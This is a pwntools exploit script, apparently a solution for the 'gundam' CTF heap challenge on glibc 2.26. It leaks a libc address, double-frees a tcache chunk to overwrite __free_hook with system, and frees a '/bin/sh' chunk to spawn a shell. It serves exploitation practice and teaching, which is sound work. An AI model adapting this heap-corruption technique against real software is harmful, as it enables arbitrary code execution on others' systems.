from pwn import *
#from LibcSearcher import *

debug=1
context.log_level='debug'
#io = process('./gundam')

libc = ELF('/usr/local/glibc-2.26/lib/libc-2.26.so')
#context.log_level="debug"

if debug:
   #io = process('gundam_debug',env={'LD_PRELOAD':'./libc.so.6'})
   io = process('./gundam_debug')
  # gdb.attach(io)
else:
    #io = process('gundam_debug',env={'LD_PRELOAD':'./libc.so.6'})
    io = process('./gundam_debug')
def build(name):
    io.sendlineafter("choice : ","1")
    io.sendlineafter("gundam :",name)
    io.sendlineafter("gundam :",'0')

def visit():
    io.sendlineafter("choice : ",'2')

def destroy(idx):
    io.sendlineafter("choice : ",'3')
    io.sendlineafter("Destory:",str(idx))

def blow_up():
    io.sendlineafter("choice : ",'4')

def leak():
    global free_hook_addr,system_addr

    for i in range(9):
        build('A'*7)
    for i in range(8):
        destroy(i)    
    blow_up()
    for i in range(7):
        build('A'*7)
    build('B'*7)    
    visit()
    leak = u64(io.recvuntil("Type[7]",drop=True)[-6:].ljust(8,b'\x00'))    
    libc_base = leak - 0x3abc78 
    free_hook_addr = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    log.info('leak:0x%x' % leak)
    log.info('libc:0x%x' % libc_base)
    log.info("__free_hook:0x%x" % free_hook_addr)
    log.info("system:0x%x" % system_addr)

def overwrite():
    destroy(2)
    destroy(1)
    destroy(0)
    destroy(0)      
    blow_up()
    build(p64(free_hook_addr))
    build('/bin/sh\x00')
    build(p64(system_addr))
    gdb.attach(io)
    pause() 
    
def pwn():
    destroy(1)    
    io.interactive()

def debug(id):
    log.info('check point %d' % id)
    gdb.attach(io)
    pause()
if __name__ == "__main__":
    leak()
    overwrite()
    pwn()

